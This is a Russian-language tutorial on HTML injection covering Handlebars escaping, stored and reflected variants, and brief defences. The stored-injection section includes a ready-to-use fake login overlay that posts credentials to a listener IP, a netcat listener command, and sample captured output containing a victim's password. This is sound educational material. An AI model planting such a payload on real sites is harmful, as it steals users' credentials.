# HTML Injection (HTML инъекция)

Инъекции Hypertext Markup Language (HTML), также иногда называемые виртуальным дефейсом. 
Они являются типом атаки, которая благодаря отсутствию надлежащей обработки пользовательского ввода позволяет злоумышленнику встроить на сайт собственный HTML-код. 
Другими словами, такая уязвимость вызывается получением некорректного HTML, как правило, через форму ввода, а затем рендер этого HTML на странице. 
Это отдельный тип уязвимости, который следует отличать от инъекции Javascript, VBscript и прочих.

Например, если вы можете внедрить HTML, вы можете добавить тег '<form>' на страницы, прося пользователя заново ввести его логин и пароль. 
Однако, при отправке такая форма передаст информацию злоумышленнику.


Используемый template engine [Handlebars](https://handlebarsjs.com/guide/#html-escaping) экранирует спец. символы если использовать `{{expression}}`:

```
    raw: & < > " ' ` =
    html-escaped: &amp; &lt; &gt; &quot; &#x27; &#x60; &#x3D;
```  
Однако если использовать  "triple-stash" `{{{expression}}}` то шаблон рендерится как есть.


## Уязвимые елементы страницы:

- Поле комментариев
- Поле поиска
- Другие поля

## Защита от HTML-инъекции

Установка HTML-скрипта, который будет фильтровать метасимволы из пользовательского ввода.
Реализация функции для проверки вводимых пользователем данных, чтобы они не содержали каких-либо конкретных тегов, которые могут привести к виртуальным искажениям.

## [Угрозы HTML-инъекции](https://habr.com/ru/companies/alexhost/articles/530862/)

- атака с использованием межсайтовых скриптов (XSS)
- подделки запросов на стороне сервера (SSRF)

На первый взгляд HTML-инъекция во многом похожа на межсайтовый скриптинг. 
Однако во время XSS-атаки можно внедрять и выполнять Javascript коды, а при HTML-инъекции приходится обходится только определенными HTML тегами.

### Сохраненный HTML

"Сохраненный HTML" — внедренный вредоносный скрипт постоянно сохраняется на сервере веб-приложений, 
который затем передает его обратно пользователю, когда он посещает внедренную веб-страницу.

Наиболее распространенный пример сохраненного HTML — это «опция комментариев» в блогах, которая позволяет любому пользователю вводить свой отзыв 
в форме комментариев для администратора или других пользователей.

*Инъекция*:

```
<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index:1000; background-color:white; padding:1em;">
Please login with valid credenitals:<br>
<form name="login" action="http://192.168.0.7:4444/login.htm">
<table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td>
<td><input type="text" name="password"/></td></tr><tr>
<td colspan=2 align=center><input type="submit" value="Login"/></td></tr>
</table></form>
```

где: IP http://192.168.0.7 это ваш IP сервера прослушки (для учебных целей взят свой IP через `ifconfig`)

Сразу просле внедрения у всех пользователей будет открывать наша форма ввода.

Давайте теперь запустим прослушиватель `netcat` через порт 4444, чтобы перехватывать запросы жертв.

`nc -lvp 4444`

Вывод перехваченных:

```
$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on jeka.local.tld 60212
GET /login.htm?username=Karl&password=1234 HTTP/1.1
Host: 192.168.8.124:4444
Connection: keep-alive
Upgrade-Insecure-Requests: 1
DNT: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
Accept-Language: ru,ru-RU;q=0.9,es-ES;q=0.8,es;q=0.7,en;q=0.6,uk;q=0.5

```


## Reflected (Отраженный) HTML

Reflected HTML возникает, когда веб-приложение немедленно отвечает на введенные пользователем данные, не проверяя их.

Вредоносный скрипт не сохраняется на веб-сервере, поэтому злоумышленнику необходимо отправить вредоносную ссылку через фишинг, чтобы поймать пользователя.

Эта уязвимость может иметь множество последствий, например, раскрытие файлов cookie сеанса пользователя, которые могут быть использованы для выдачи себя за жертву, или, в более общем плане, она может позволить злоумышленнику изменить содержимое страницы, которое видят жертвы.

Reflected HTML бывает трех типов:

- Reflected HTML GET. Запрашивает данные из определенного источника.
- Reflected HTML POST. Оправляет данные на сервер для создания/обновления ресурса.
- Reflected HTML Текущий URL.

